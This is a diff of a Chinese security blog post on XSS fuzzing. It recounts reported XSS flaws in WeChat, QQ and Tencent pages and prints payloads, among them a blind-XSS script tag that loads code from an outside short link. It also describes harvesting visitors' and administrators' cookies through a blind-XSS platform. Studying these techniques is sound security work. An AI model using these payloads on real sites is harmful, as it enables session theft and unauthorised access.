@@ -8,7 +8,7 @@ XSS应该是我挖过的最多漏洞的一种Web漏洞类型，累积下来，�
 
 **XSS的Fuzzing流程**
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259301866\_8855\_1490259302672.jpg)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259301866_8855_1490259302672.jpg)
 
 这是一个比较常规的Web漏扫中XSS检测插件的一个流程图，其中比较关键的几个点在于：
 
@@ -30,7 +30,7 @@ XSS应该是我挖过的最多漏洞的一种Web漏洞类型，累积下来，�
 
 其实Payload的生成就是一个不断Fuzzing和不断调整的过程，根据注入位置上下文代码的结构、内容以及应用过滤机制等不断调整和不断提交测试的过程，下图是一个Payload的生成流程。
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259526183\_2803\_1490259526753.jpg)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259526183_2803_1490259526753.jpg)
 
 那么假如某次Payload调整后Fuzzing成功，也就意味XSS注入成功，并得出这个漏洞的PoC。
 
@@ -40,15 +40,15 @@ XSS应该是我挖过的最多漏洞的一种Web漏洞类型，累积下来，�
 
 **不一样的昵称**
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259664341\_7612\_1490259665162.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259664341_7612_1490259665162.png)
 
 这是一个微信网页版的存储型XSS，注入点是微信昵称的位置（右图），通过访问微信群成员列表可以触发XSS导致弹框。
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259687712\_2773\_1490259688437.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259687712_2773_1490259688437.png)
 
 这是微信某个春节摇一摇活动的XSS（这里是生效了`<h1>`），通过微信访问活动页面，自动授权后获取微信昵称并自动显示在活动页面，当时微信昵称是：`<h1>张祖优(Fooying)";alert(0)//`，由于`<h1>`生效，导致昵称显示变大。
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259762767\_2408\_1490259763381.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259762767_2408_1490259763381.png)
 
 这仍然是腾讯某个产品的活动页面，也是通过微信点击自动获取昵称然后在活动页面显示，这个截图的页面链接实际是：
 
@@ -56,13 +56,13 @@ XSS应该是我挖过的最多漏洞的一种Web漏洞类型，累积下来，�
 http://tdf.qq.com/mobile/index2.html?name=<a href="http://www.fooying.com">点击抽奖</a>&type=share&from=timeline&isappinstalled=1
 ```
 
-相当于当时我的昵称是：`<a href="http://www.fooying.com">点击抽奖</a>`![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259808682\_4812\_1490259809864.png)
+相当于当时我的昵称是：`<a href="http://www.fooying.com">点击抽奖</a>`![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259808682_4812_1490259809864.png)
 
 这也是一个微信网页版存储型XSS，注入点同样是在昵称，通过访问通讯录可以触发XSS，触发的昵称大概是：`<img src=0 onerror=alert(5)>`。
 
 看了几个漏洞，再给大家看看我之前的QQ昵称和微信昵称：
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/qq\_nichen.jpg)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/qq_nichen.jpg)
 
 其中右图的昵称是`<h1>张祖优(xxxx)";alert(0)//`。
 
@@ -72,7 +72,7 @@ http://tdf.qq.com/mobile/index2.html?name=<a href="http://www.fooying.com">点�
 
 **网址跳转中的规律**
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260087088\_9851\_1490260087822.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260087088_9851_1490260087822.png)
 
 这是一个13年提交的腾讯云登录跳转的XSS。
 
@@ -87,23 +87,23 @@ http://www.xxx.com/login?url=xxx
 http://www.xxx.com/reg?url=xxx
 ```
 
-而整体的测试流程大概是这样的：![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260170587\_2893\_1490260171238.png)
+而整体的测试流程大概是这样的：![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260170587_2893_1490260171238.png)
 
 **#号里的秘密**
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260253352\_826\_1490260253960.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260253352_826_1490260253960.png)
 
 这是之前腾讯云官网的一个DOM XSS
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260299893\_848\_1490260300657.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260299893_848_1490260300657.png)
 
 这是之前微信国外版官网的一处 DOM XSS
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260334210\_8515\_1490260335080.jpeg)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260334210_8515_1490260335080.jpeg)
 
 这是之前ent.qq.com域下的一个DOM XSS，这里应该是实现一个页面访问来源统计的功能，将referer拼接到URL通过img加载的方式发起GET请求以此向服务端发送访问来源URL，黑客可以构造地址为`http://www.0xsafe.com" onerror="alert(0)` 的页面点击链接跳转到 `http://datalib.ent.qq.com/tv/3362/detail.shtml`，就可以触发XSS。
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260393558\_2896\_1490260394596.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260393558_2896_1490260394596.png)
 
 这是比较早提交的一个游戏igame.qq.com的DOM XSS，这处的XSS正好当时保存下JS，如下，读取window.location然后写入到ID为output的标签代码里，于是导致XSS的产生。
 
@@ -131,35 +131,35 @@ window.location
 
 **被改变的内容**
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260533757\_8493\_1490260534472.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260533757_8493_1490260534472.png)
 
 这是之前挖的一个存在于以前PC 版本QQ的网页预览功能的一个XSS；通过在聊天窗口分享文章，然后点击链接会在右侧打开页面显示文章的内容，会导致XSS的产生。
 
 > 为什么在客户端里也会存在XSS?其实很多客户端，包括现在很多手机APP，很多功能都是通过内嵌网页进行实现的，于是也就为什么会存在XSS等前端问题。这些网页可以通过设置代理的方式来发现。
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260575096\_5063\_1490260575886.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260575096_5063_1490260575886.png)
 
 这是一篇发表在博客园的文章，文章里包含一些XSS的攻击代码，但是可以发现代码在博客园本身已经被进行了转义，没法产生XSS。
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260620615\_3974\_1490260621196.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260620615_3974_1490260621196.png)
 
 而文章被在QQ中预览的时候，可以发现，被转义的攻击代码又转义了回来（因为这个功能需要只显示文本内容，而删除一些没必要的页面框架、内容的显示，所有对内容有做了一些转码等操作），导致的攻击代码的生效，并由此产生了XSS（其实这类XSS叫做mXSS，突变型XSS）。
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260654619\_6339\_1490260655454.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260654619_6339_1490260655454.png)
 
 这是一篇发表在微信公众号的文章，文章中包含了一些XSS盲打（后面会进行介绍）的攻击代码，然后可以看到，在微信公众号文章里代码被进行了转义，而无法生效产生XSS。
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260686959\_8118\_1490260687674.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260686959_8118_1490260687674.png)
 
 chuansong.me是一个第三方网站，会主动采集微信公众号上的一些文章并生成访问链接和索引，可以看到同样的一篇文章在被传送门采集转载后，本来会被转义的代码直接生效了，于是就成为了存储型XSS，我们通过盲打平台也可以看到其他用户访问这篇文章而被采集并发送到盲打平台的Cookie。
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260725666\_8096\_1490260726286.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260725666_8096_1490260726286.png)
 
 有的时候，被转义的内容也会成为生效的攻击代码，通过控制源头的方式也可以使得XSS的攻击产生。
 
 **随手进行的XSS盲打**
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260769622\_7106\_1490260770591.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260769622_7106_1490260770591.png)
 
 这是我XSS盲打平台项目的其中一页结果截图，这里的每一项都包含对应网址访问用户的Cookie，而Cookie则可以用来直接登录对应的地址；在图里包含了360 soso、360游戏客服、新浪邮箱等几个网站的后台的Cookie，不过可惜的是，由于这些平台进行了访问限制，所以外网无法访问，也无法登录。
 
@@ -167,10 +167,9 @@ chuansong.me是一个第三方网站，会主动采集微信公众号上的一�
 
 > 常规的XSS攻击是通过页面返回内容中JS攻击代码的生效与否来判断XSS的攻击是否成功；而对于一些网页功能，比如反馈，我们可以发现，不管你提交什么内容，返回的内容都是"感谢您的反馈"类似的语句，并不会根据你提交的内容而在页面中显示不同的内容，对于这样的内容提交点，就无法通过页面反馈判断攻击代码是否注入成功，那么就可以通过XSS盲打。\
 > XSS盲打一般通过XSS盲打平台，在XSS盲打平台建立项目，会生成项目攻击链接，实际上就是一个类似JS文件的访问链接，这个JS文件中其中至少包含一个功能，那就是向盲打平台发送GET/POST请求传输数据回来，比如Cookie，这样的话，类似在反馈页面提交的攻击代码一旦生效，就等于JS代码被执行，那么就会向盲打平台返回数据，那就说明攻击成功了；假如一直没有返回数据，那就说明提交的攻击代码没有执行或者执行出问题，也就证明攻击失败。\
-> 盲打平台的项目：\
->
+> 盲打平台的项目：<br>
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260814055\_1991\_1490260814898.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260814055_1991_1490260814898.png)
 
 对于我而言，看到类似下图这样一个内容提交的地方，我都会忍不住提交盲打代码
 
@@ -178,11 +177,11 @@ chuansong.me是一个第三方网站，会主动采集微信公众号上的一�
 </textarea>'"><script src=http://t.cn/R6qRcps></script>
 ```
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260857481\_2744\_1490260858052.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260857481_2744_1490260858052.png)
 
 而类似于这样的功能，如果存在XSS，一般会在什么地方什么时候出发攻击代码呢？管理人员在后台审核这些内容的时候，所以说一般XSS盲打如果成功，往往可以获得对应功能管理后台的地址以及管理员的Cookie，假如管理后台没有做访问的限制，就能用对应管理员的Cookie登录上去。
 
-![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260866874\_8430\_1490260867678.png)
+![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260866874_8430_1490260867678.png)
 
 这就是上图手游客服中心盲打成功得到的后台地址和Cookie（当前已失效并修复）。
 
